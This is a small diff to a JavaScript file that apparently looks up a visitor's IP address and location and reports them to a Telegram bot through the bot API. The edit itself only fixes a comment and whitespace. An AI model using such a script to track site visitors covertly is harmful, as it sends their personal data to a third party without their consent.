@@ -34,7 +34,7 @@ async function getIPAndLocation() {
   }
 }
 
-// Send Telegram Message dd
+// Send Telegram Message
 function sendAlert(message) {
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
@@ -106,4 +106,3 @@ document.addEventListener("visibilitychange", () => {
 
 // Start
 getIPAndLocation();
-
